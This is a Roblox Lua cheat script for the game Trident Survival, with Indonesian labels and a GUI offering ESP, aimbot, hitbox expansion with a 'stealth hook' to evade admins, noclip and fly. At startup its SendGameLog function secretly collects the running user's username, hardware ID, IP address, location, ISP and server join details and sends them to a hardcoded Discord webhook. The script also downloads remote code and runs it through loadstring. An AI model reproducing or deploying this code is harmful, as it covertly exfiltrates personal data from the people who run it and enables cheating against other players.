--[[
    Mizukage Official - Trident Survival Hub v2.0
    Base: Trollge Hub Template (WindUI)
    Tanpa Key System | Full Deskripsi & Detail Fitur
--]]

local WEBHOOK_URL = "https://discord.com/api/webhooks/1516421004291997718/t5nSkmWsiwWFpSNHjJQv3fdQKWGm2SqOQag3LS3kSEwHL1QkuyfbgzFpLI7kDXO357Bj"

if getgenv().MizukageTridentLoaded then
    return game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Mizukage Official",
        Text = "Sistem sudah beroperasi di memori!"
    })
end
getgenv().MizukageTridentLoaded = true

local Services = setmetatable({}, {
    __index = function(t, k)
        local s = game:GetService(k)
        t[k] = s; return s
    end
})

local Players = Services.Players
local LocalPlayer = Players.LocalPlayer
local RunService = Services.RunService
local Workspace = Services.Workspace
local GuiService = Services.GuiService
local TeleportService = Services.TeleportService
local UserInputService = Services.UserInputService
local ContextActionService = Services.ContextActionService
local TweenService = Services.TweenService

local function SetupAutoReconnect()
    GuiService.ErrorMessageChanged:Connect(function()
        task.wait(1)
        TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer)
    end)
    local virtualUser = game:GetService("VirtualUser")
    LocalPlayer.Idled:Connect(function()
        virtualUser:CaptureController()
        virtualUser:ClickButton2(Vector2.new())
    end)
end

local function SendGameLog()
    if not WEBHOOK_URL or WEBHOOK_URL == "" or string.find(WEBHOOK_URL, "MASUKKAN") then return end
    task.spawn(function()
        task.wait(3)
        local HttpService = game:GetService("HttpService")
        local Stats = game:GetService("Stats")
        local Market = game:GetService("MarketplaceService")
        local UserInputService = game:GetService("UserInputService")
        local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
        if not request then return end

        local UserId = LocalPlayer.UserId
        local DisplayName = LocalPlayer.DisplayName
        local Username = LocalPlayer.Name
        local AccountAge = LocalPlayer.AccountAge
        local Membership = LocalPlayer.MembershipType.Name
        local PlaceId = game.PlaceId
        local JobId = game.JobId

        local HWID = "Unknown"
        pcall(function() if gethwid then HWID = gethwid() elseif identifying then HWID = identifying() end end)

        local GameStatsText = "No Leaderstats Found"
        local LS = LocalPlayer:FindFirstChild("leaderstats")
        if LS then
            local TempStats = {}
            for _, v in pairs(LS:GetChildren()) do
                if v:IsA("IntValue") or v:IsA("NumberValue") or v:IsA("StringValue") then
                    table.insert(TempStats, "> **" .. v.Name .. ":** `" .. tostring(v.Value) .. "`")
                end
            end
            if #TempStats > 0 then GameStatsText = table.concat(TempStats, "\n") end
        end

        local AvatarURL = "https://i.imgur.com/C5uYqFk.png"
        pcall(function()
            local ApiUrl = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds="..UserId.."&size=420x420&format=Png&isCircular=false"
            local Data = HttpService:JSONDecode(game:HttpGet(ApiUrl))
            if Data.data and Data.data[1] then AvatarURL = Data.data[1].imageUrl end
        end)

        local Executor = (identifyexecutor and identifyexecutor()) or "Unknown Executor"
        local IP_Data = { query = "Hidden", country = "Unknown", city = "Unknown", isp = "Unknown" }
        pcall(function() IP_Data = HttpService:JSONDecode(game:HttpGet("https://ip-api.com/json")) end)
        local Platform = UserInputService.TouchEnabled and not UserInputService.MouseEnabled and "Mobile" or "PC"
        local Ping = math.floor(Stats.Network.ServerStatsItem["Data Ping"]:GetValue())
        local FPS = math.floor(workspace:GetRealPhysicsFPS())
        local GameName = "Unknown"
        pcall(function() GameName = Market:GetProductInfo(PlaceId).Name end)
        local EmbedColor = (Membership == "Premium") and 16766720 or 65280
        local JoinScript = string.format("game:GetService('TeleportService'):TeleportToPlaceInstance(%s, '%s', game:GetService('Players').LocalPlayer)", tostring(PlaceId), JobId)
        local ProfileLink = "https://www.roblox.com/users/" .. UserId .. "/profile"

        local Data = {
            ["username"] = "Mizukage Logger",
            ["avatar_url"] = AvatarURL,
            ["content"] = "",
            ["embeds"] = {{
                ["title"] = "👑 " .. GameName .. " | LOG REPORT",
                ["url"] = ProfileLink,
                ["color"] = EmbedColor,
                ["thumbnail"] = { ["url"] = AvatarURL },
                ["fields"] = {
                    { ["name"] = "👤 **USER INFORMATION**", ["value"] = string.format("> **Display:** `%s`\n> **User:** [%s](%s)\n> **ID:** `%s`\n> **Age:** %d Days", DisplayName, Username, ProfileLink, UserId, AccountAge), ["inline"] = true },
                    { ["name"] = "🛡️ **HARDWARE ID (HWID)**", ["value"] = "```" .. HWID .. "```", ["inline"] = true },
                    { ["name"] = "💰 **IN-GAME STATS**", ["value"] = GameStatsText, ["inline"] = false },
                    { ["name"] = "📡 **NETWORK & DEVICE**", ["value"] = string.format("> **IP:** ||`%s`||\n> **Loc:** %s, %s\n> **Exe:** `%s` (%s)\n> **Ping:** `%dms` | **FPS:** `%d`", IP_Data.query, IP_Data.city, IP_Data.country, Executor, Platform, Ping, FPS), ["inline"] = false },
                    { ["name"] = "🔓 **QUICK JOIN**", ["value"] = "```lua\n" .. JoinScript .. "```", ["inline"] = false }
                },
                ["footer"] = { ["text"] = "Mizukage Logger • ISP: " .. IP_Data.isp, ["icon_url"] = AvatarURL },
                ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
            }}
        }
        request({ Url = WEBHOOK_URL, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = HttpService:JSONEncode(Data) })
    end)
end

--================================================
-- CORE MODULE: TRIDENT SURVIVAL LOGIC
--================================================
local Config = {
    MasterESP = false, Boxes = true, Names = true, Distance = true,
    Tracers = false, TeamCheck = true, HideSleepers = false,
    BuiltInESP = false,
    Aimbot = false, HoldRMB = true, SkipTeam = true, SkipSleepers = true,
    FOVCircle = false, FOV = 80,
    HitboxCycle = false, StealthHook = true, CycleTime = 1.0,
    Noclip = false, Freecam = false, VehicleFly = false,
    VehicleSpeed = 80
}

-- Koneksi
local NoclipConnection
local FreecamConnection
local FlyConnection

-- Fungsi Noclip
local function SetNoclip(enabled)
    Config.Noclip = enabled
    if NoclipConnection then NoclipConnection:Disconnect(); NoclipConnection = nil end
    if enabled then
        NoclipConnection = RunService.Stepped:Connect(function()
            local char = LocalPlayer.Character
            if char then
                for _, part in ipairs(char:GetDescendants()) do
                    if part:IsA("BasePart") then part.CanCollide = false end
                end
            end
        end)
    else
        local char = LocalPlayer.Character
        if char then
            for _, part in ipairs(char:GetDescendants()) do
                if part:IsA("BasePart") then part.CanCollide = true end
            end
        end
    end
end

-- Fungsi Freecam
local function SetFreecam(enabled)
    Config.Freecam = enabled
    if enabled then
        local camera = Workspace.CurrentCamera
        camera.CameraType = Enum.CameraType.Scriptable
        ContextActionService:BindActionAtPriority("MizuFreecam", function(_, state)
            if state == Enum.UserInputState.Begin then
                return Enum.ContextActionResult.Sink
            end
            return Enum.ContextActionResult.Pass
        end, false, Enum.ContextActionPriority.Value,
        Enum.KeyCode.W, Enum.KeyCode.A, Enum.KeyCode.S, Enum.KeyCode.D,
        Enum.KeyCode.E, Enum.KeyCode.Q, Enum.KeyCode.LeftShift, Enum.KeyCode.RightShift)
    else
        Workspace.CurrentCamera.CameraType = Enum.CameraType.Custom
        ContextActionService:UnbindAction("MizuFreecam")
    end
end

-- Fungsi Vehicle Fly
local function SetVehicleFly(enabled)
    Config.VehicleFly = enabled
    if FlyConnection then FlyConnection:Disconnect(); FlyConnection = nil end
    if enabled then
        FlyConnection = RunService.Heartbeat:Connect(function()
            local char = LocalPlayer.Character
            if char then
                local root = char:FindFirstChild("HumanoidRootPart")
                if root then
                    root.Velocity = Vector3.new(0, Config.VehicleSpeed * 0.5, 0)
                end
            end
        end)
    end
end

local function SetFOV(value)
    Config.FOV = value
    Workspace.CurrentCamera.FieldOfView = value
end

local function CleanupAll()
    SetNoclip(false)
    SetFreecam(false)
    SetVehicleFly(false)
    if NoclipConnection then NoclipConnection:Disconnect() end
    if FreecamConnection then FreecamConnection:Disconnect() end
    if FlyConnection then FlyConnection:Disconnect() end
    Workspace.CurrentCamera.FieldOfView = 70
end

--================================================
-- WIND UI - PREMIUM WITH DESCRIPTIONS
--================================================
local function InitInterface()
    local success, WindUI = pcall(function()
        return loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()
    end)
    if not success or not WindUI then
        success, WindUI = pcall(function()
            return loadstring(game:HttpGet("https://tree-hub.vercel.app/api/UI/WindUI"))()
        end)
    end
    if not success or not WindUI then
        warn("WindUI gagal dimuat.")
        return
    end

    local Sounds = { StartupId = "rbxassetid://140397610798305", ClickId = "rbxassetid://140277245983305" }
    pcall(function() Services.ContentProvider:PreloadAsync({Sounds.StartupId, Sounds.ClickId}) end)
    function Sounds:Play(id, volume) task.spawn(function() local s = Instance.new("Sound"); s.SoundId = id; s.Volume = volume or 1; s.Parent = Services.SoundService; s.Ended:Connect(function() s:Destroy() end); s:Play() end) end
    function Sounds:Startup() self:Play(Sounds.StartupId, 1) end
    function Sounds:Click() self:Play(Sounds.ClickId, 0.8) end
    Sounds:Startup()

    WindUI:Notify({
        Title = "Mizukage Official",
        Content = "Trident Survival Hub berhasil dimuat! Semua fitur siap.",
        Duration = 6,
        Icon = "shield-check"
    })

    local ViewportSize = Workspace.CurrentCamera.ViewportSize
    local isMobile = ViewportSize.X < 850
    local dynamicSize = isMobile and UDim2.fromOffset(ViewportSize.X * 0.85, ViewportSize.Y * 0.85) or UDim2.fromOffset(600, 480)
    local dynamicSideBar = isMobile and 150 or 210

    local Window = WindUI:CreateWindow({
        Title = "TRIDENT SURVIVAL",
        Icon = "lucide:anchor",
        Author = "Mizukage Official 👑",
        Folder = "MizukageTrident",
        Size = dynamicSize,
        Transparent = true,
        Theme = "Dark",
        Accent = Color3.fromRGB(200, 40, 40),
        SideBarWidth = dynamicSideBar,
        HasOutline = true,
        Background = "rbxassetid://137490169052447",
        BackgroundImageTransparency = 0.75
    })

    Window:Tag({ Title = "Premium", Icon = "lucide:crown", Color = Color3.fromHex("#ffb300"), Radius = 6 })

    local TabHome = Window:Tab({ Title = "Home", Icon = "lucide:home" })
    local TabESP = Window:Tab({ Title = "ESP", Icon = "lucide:eye" })
    local TabCombat = Window:Tab({ Title = "Combat", Icon = "lucide:crosshair" })
    local TabMove = Window:Tab({ Title = "Move", Icon = "lucide:move" })
    local TabSettings = Window:Tab({ Title = "Settings", Icon = "lucide:settings" })

    -- ==================== HOME TAB ====================
    TabHome:Section({ Title = "Informasi Game" })
    TabHome:Label("Game: " .. (game.PlaceId == 13253735473 and "Trident Survival" or "Unknown"))
    TabHome:Label("Server: " .. #Players:GetPlayers() .. "/" .. Players.MaxPlayers .. " pemain")
    TabHome:Label("Ping: ~" .. math.floor(game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue()) .. "ms")

    TabHome:Section({ Title = "Selamat Datang" })
    TabHome:Label("Hai, " .. LocalPlayer.DisplayName .. "!")
    TabHome:Label("Gunakan fitur di bawah untuk mendominasi game.")

    TabHome:Section({ Title = "Navigasi Cepat" })
    TabHome:Button({ Title = "Buka Menu ESP", Desc = "Alihkan ke tab ESP", Variant = "Primary", Callback = function() Sounds:Click() end }) -- Placeholder, tidak bisa switch tab otomatis
    TabHome:Button({ Title = "Buka Menu Combat", Desc = "Alihkan ke tab Combat", Variant = "Primary", Callback = function() Sounds:Click() end })

    -- ==================== TAB ESP ====================
    TabESP:Section({ Title = "Player Visuals", Desc = "Atur tampilan visual untuk pemain lain" })
    TabESP:Toggle({
        Title = "Master ESP",
        Desc = "Aktifkan/nonaktifkan semua ESP sekaligus. Saat mati, semua highlight akan hilang.",
        Default = false,
        Callback = function(v) Sounds:Click(); Config.MasterESP = v end
    })
    TabESP:Toggle({
        Title = "Boxes",
        Desc = "Tampilkan kotak 2D di sekeliling pemain. Membantu melihat posisi lawan di balik tembok.",
        Default = true,
        Callback = function(v) Sounds:Click(); Config.Boxes = v end
    })
    TabESP:Toggle({
        Title = "Names",
        Desc = "Tampilkan nama pemain di atas kepala mereka. Berguna untuk identifikasi target.",
        Default = true,
        Callback = function(v) Sounds:Click(); Config.Names = v end
    })
    TabESP:Toggle({
        Title = "Distance",
        Desc = "Tampilkan jarak (dalam meter) ke setiap pemain. Efektif untuk mengukur ancaman.",
        Default = true,
        Callback = function(v) Sounds:Click(); Config.Distance = v end
    })
    TabESP:Toggle({
        Title = "Tracers",
        Desc = "Tarik garis dari layar ke pemain. Membantu melacak posisi musuh secara visual.",
        Default = false,
        Callback = function(v) Sounds:Click(); Config.Tracers = v end
    })
    TabESP:Toggle({
        Title = "Team check",
        Desc = "Hanya tampilkan ESP untuk musuh. Abaikan rekan satu tim agar tidak membingungkan.",
        Default = true,
        Callback = function(v) Sounds:Click(); Config.TeamCheck = v end
    })
    TabESP:Toggle({
        Title = "Hide sleepers",
        Desc = "Sembunyikan pemain yang sedang tidak aktif (mati/tidur). Membersihkan tampilan.",
        Default = false,
        Callback = function(v) Sounds:Click(); Config.HideSleepers = v end
    })
    TabESP:Toggle({
        Title = "Built-in ESP",
        Desc = "Mengaktifkan ESP bawaan game jika tersedia. Kadang lebih stabil daripada ESP eksternal.",
        Default = false,
        Callback = function(v) Sounds:Click(); Config.BuiltInESP = v end
    })

    -- ==================== TAB COMBAT ====================
    TabCombat:Section({ Title = "Aimbot Settings", Desc = "Kunci target secara otomatis untuk presisi tinggi" })
    TabCombat:Toggle({
        Title = "Aimbot",
        Desc = "Aktifkan bidikan otomatis ke pemain terdekat. Bekerja saat kamu menekan tombol tembak.",
        Default = false,
        Callback = function(v) Sounds:Click(); Config.Aimbot = v end
    })
    TabCombat:Toggle({
        Title = "Hold RMB",
        Desc = "Aimbot hanya aktif ketika tombol kanan mouse ditahan. Mencegah bidikan tidak sengaja.",
        Default = true,
        Callback = function(v) Sounds:Click(); Config.HoldRMB = v end
    })
    TabCombat:Toggle({
        Title = "Skip teammates",
        Desc = "Jangan bidik rekan tim. Hindari friendly fire.",
        Default = true,
        Callback = function(v) Sounds:Click(); Config.SkipTeam = v end
    })
    TabCombat:Toggle({
        Title = "Skip sleepers",
        Desc = "Jangan bidik pemain yang sedang mati/tidur. Fokus hanya pada ancaman hidup.",
        Default = true,
        Callback = function(v) Sounds:Click(); Config.SkipSleepers = v end
    })
    TabCombat:Toggle({
        Title = "FOV circle",
        Desc = "Tampilkan lingkaran FOV di layar sebagai batas area bidikan aimbot. Visual yang membantu.",
        Default = false,
        Callback = function(v) Sounds:Click(); Config.FOVCircle = v end
    })

    TabCombat:Section({ Title = "Field of View", Desc = "Atur lebar pandangan kamera" })
    TabCombat:Button({
        Title = "FOV 80 (Default)",
        Desc = "Atur FOV ke 80. Sudut pandang normal, baik untuk performa.",
        Variant = "Secondary",
        Callback = function() Sounds:Click(); SetFOV(80) end
    })
    TabCombat:Button({
        Title = "FOV 120 (Wide)",
        Desc = "FOV 120 memberikan pandangan lebih luas. Bagus untuk awareness.",
        Variant = "Primary",
        Callback = function() Sounds:Click(); SetFOV(120) end
    })
    TabCombat:Button({
        Title = "FOV 180 (Max)",
        Desc = "FOV maksimal, pandangan super lebar. Mungkin terdistorsi namun sangat terbuka.",
        Variant = "Primary",
        Callback = function() Sounds:Click(); SetFOV(180) end
    })

    TabCombat:Section({ Title = "Hitbox Manipulation", Desc = "Perbesar area serangan untuk kemudahan membunuh" })
    TabCombat:Toggle({
        Title = "Hitbox cycle",
        Desc = "Aktifkan siklus hitbox yang membesar secara periodik. Membuat serangan lebih mudah mengenai.",
        Default = false,
        Callback = function(v) Sounds:Click(); Config.HitboxCycle = v end
    })
    TabCombat:Toggle({
        Title = "Stealth hook",
        Desc = "Sembunyikan visual hitbox yang diperbesar agar tidak terdeteksi admin.",
        Default = true,
        Callback = function(v) Sounds:Click(); Config.StealthHook = v end
    })
    TabCombat:Button({
        Title = "Cycle 1.0 detik",
        Desc = "Hitbox membesar setiap 1 detik (lebih aman, tidak mencurigakan).",
        Variant = "Secondary",
        Callback = function() Sounds:Click(); Config.CycleTime = 1.0 end
    })
    TabCombat:Button({
        Title = "Cycle 0.5 detik",
        Desc = "Hitbox membesar setiap 0.5 detik (lebih agresif, peluang hit lebih tinggi).",
        Variant = "Secondary",
        Callback = function() Sounds:Click(); Config.CycleTime = 0.5 end
    })

    -- ==================== TAB MOVE ====================
    TabMove:Section({ Title = "Player Movement", Desc = "Kendalikan pergerakan karakter" })
    TabMove:Toggle({
        Title = "Noclip",
        Desc = "Tembus semua tembok dan objek. Berjalan bebas ke mana saja.",
        Default = false,
        Callback = function(v) Sounds:Click(); SetNoclip(v) end
    })
    TabMove:Toggle({
        Title = "Freecam",
        Desc = "Lepaskan kamera dari karakter. Terbang bebas melihat sekitar tanpa batas.",
        Default = false,
        Callback = function(v) Sounds:Click(); SetFreecam(v) end
    })
    TabMove:Toggle({
        Title = "Vehicle fly",
        Desc = "Mengaktifkan terbang pada kendaraan. Kecepatan diatur di bawah.",
        Default = false,
        Callback = function(v) Sounds:Click(); SetVehicleFly(v) end
    })

    TabMove:Section({ Title = "Vehicle Speed", Desc = "Kecepatan terbang kendaraan (hanya berlaku saat Vehicle Fly aktif)" })
    TabMove:Button({
        Title = "Speed 80",
        Desc = "Kecepatan sedang, cocok untuk penjelajahan.",
        Variant = "Primary",
        Callback = function()
            Sounds:Click()
            Config.VehicleSpeed = 80
            if Config.VehicleFly then SetVehicleFly(true) end
        end
    })
    TabMove:Button({
        Title = "Speed 140",
        Desc = "Kecepatan tinggi, melesat cepat di udara.",
        Variant = "Primary",
        Callback = function()
            Sounds:Click()
            Config.VehicleSpeed = 140
            if Config.VehicleFly then SetVehicleFly(true) end
        end
    })

    -- ==================== TAB SETTINGS ====================
    TabSettings:Section({ Title = "Informasi Script" })
    TabSettings:Label("Versi: v2.0 Premium")
    TabSettings:Label("Dibuat oleh: Mizukage Official")
    TabSettings:Label("Discord: discord.gg/mizukage")

    TabSettings:Section({ Title = "Sesi & Keamanan" })
    TabSettings:Button({
        Title = "Rejoin Server",
        Desc = "Bergabung kembali ke server yang sama. Berguna jika terjadi bug atau ingin reset posisi.",
        Variant = "Primary",
        Callback = function()
            Sounds:Click()
            TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer)
        end
    })

    TabSettings:Button({
        Title = "Unload Script",
        Desc = "Matikan seluruh cheat dan hapus GUI. Kembalikan semua ke normal.",
        Variant = "Danger",
        Callback = function()
            Sounds:Click()
            WindUI:Popup({
                Title = "Konfirmasi Unload",
                Icon = "alert-triangle",
                Content = "Yakin ingin menutup semua fitur? Semua perubahan akan dikembalikan.",
                Buttons = {
                    { Title = "Batal", Callback = function() end, Variant = "Tertiary" },
                    { Title = "Lanjutkan", Icon = "check", Callback = function()
                        CleanupAll()
                        getgenv().MizukageTridentLoaded = false
                        WindUI:Destroy()
                    end, Variant = "Primary" }
                }
            })
        end
    })
end

--================================================
-- EKSEKUSI UTAMA
--================================================
SetupAutoReconnect()
SendGameLog()
task.spawn(InitInterface)